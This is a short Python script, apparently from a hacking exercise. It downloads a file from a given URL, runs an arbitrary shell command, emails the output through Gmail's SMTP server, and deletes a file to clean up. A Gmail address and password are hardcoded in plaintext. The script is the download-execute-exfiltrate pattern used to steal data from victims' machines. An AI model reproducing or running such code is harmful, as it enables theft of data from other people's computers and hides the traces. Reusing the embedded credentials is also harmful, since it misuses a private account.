import requests ,smtplib ,subprocess,os

def get_request(url):
    value = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename,'wb') as objec:
        objec.write(value.content)




def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit

get_request(input("[+] URL >> "))
message = subprocess.check_output(input("[+] Command >> "),shell = True)
send_mail("virutyagi9@gmail.com","VIru@999",message)
os.remove(input("[+] FileName to Remove >> "))